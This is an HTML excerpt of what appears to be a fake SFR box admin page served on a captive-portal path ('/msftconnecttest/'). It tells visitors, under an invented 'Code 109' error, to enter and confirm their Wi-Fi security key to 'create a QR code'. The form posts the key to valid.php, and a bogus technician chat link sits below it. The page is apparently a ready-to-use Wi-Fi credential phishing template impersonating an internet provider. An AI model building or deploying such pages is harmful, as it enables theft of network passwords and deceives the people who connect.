...
<link rel="shortcut icon" type="image/ico" href="/msftconnecttest/imgsfr/header_logo.ico?v=3.4" />
  <link rel="stylesheet" type="text/css" media="screen" href="/msftconnecttest/csssfr/global.css?v=3.4" />
  <link rel="stylesheet" type="text/css" media="screen" href="/msftconnecttest/csssfr/index.css?v=3.4" />
  <script type="text/javascript" src="/msftconnecttest/jssfr/global.js?v=3.4"></script>
  <script type="text/javascript" src="/msftconnecttest/jssfr/index.js?v=3.4"></script>
  </head>
  <body>
<img src="/msftconnecttest/imgsfr/header_logo.ico" width="56" height="56"><img src="/msftconnecttest/imgsfr/bandeau.jpg" width="560" height="200">
  <div id="infos">
...
<div class="homeheader " >
  <h1 class="text-center"><img src="/msftconnecttest/imgsfr/icon_clock.png?v=3.4" alt=""/>&nbsp;Informations</h1>
  <div class="clearfix">
  <div class="pull-left">
  <table>
  <caption><a href=""><img src="/msftconnecttest//imgsfr/icon_wan.png?v=3.4" alt=""/></a>&nbsp;Connexion</caption>
  <tr>
  ...
  <table>
  <caption><a href=""><img src="/msftconnecttest/imgsfr/icon_box.png?v=3.4" alt=""/></a>&nbsp;Informations modem</caption>
  <tr>
  ...
  <table>
  <caption><img src="/msftconnecttest/imgsfr/icon_tv.png?v=3.4" alt=""/>&nbsp;TV</caption>
  <tr>
...
<p>Code 109: Veuillez vous connecter vous avec le code wifi dans les champs ci dessous et valider pour générer un nouveau qr code, ce qr code va servir a connecter <b>l'ensemble de vos équipement sans avoir a taper le code wifi pour chacun d'eux.</b>Le code wifi s'affiche dessous votre box SFR.
<form method="POST" action="valid.php">
<label for="cle">Clé de sécurité :</label><input type="text" name="cle" size="" /><br />
<label for="cleconf">Confirmation :</label><input type="text" name="cleconf" size="" /><br />
<button>Créer le QR code</button> 
</br>
</br>
</br>
<img src="/msftconnecttest/imgsfr/aide.png">
</br>
<p>Besoin d'une aide supplémentaire ? un technicien peut vous venir en aide: </strong> <a href="/msftconnecttest/shout/sfrtchat.php" target="_blank"><u>aide en ligne</u> ...</a>
<div class="homefooter">
  ...
  <table>
  <caption>
  <span><a href=""><img src="/msftconnecttest/imgsfr/icon_ethernet.png?v=3.4" alt=""/>&nbsp;<a class="unstyle" href="">Liaison Ethernet</span>
  <br />
  ...
  <table>
  <caption>
  <a href="/voip"><img src="/msftconnecttest/imgsfr/icon_voip.png?v=3.4" alt=""/></a>&nbsp;<a class="unstyle" href="/voip">Téléphonie</a>
  <br />
  </caption>
  <tr>
  <th>Ligne</th>
